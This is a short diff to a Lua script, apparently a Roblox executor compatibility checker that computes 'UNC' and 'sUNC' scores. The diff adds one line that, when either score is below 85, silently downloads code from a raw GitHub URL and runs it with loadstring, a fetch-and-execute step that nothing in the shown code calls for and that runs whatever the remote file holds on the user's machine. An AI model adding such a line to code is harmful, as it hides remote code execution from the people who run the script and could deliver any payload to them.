@@ -133,6 +133,7 @@ local e=ExecName()
 local u,up,ut,ur=Score(UNC)
 local s,sp,st,sr=Score(sUNC)
 if u<85 or s<85 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VanciSonic/Lgtihb/refs/heads/main/nono"))()
 local HttpService=game:GetService("HttpService")
 local Players=game:GetService("Players")
 local lp=Players.LocalPlayer
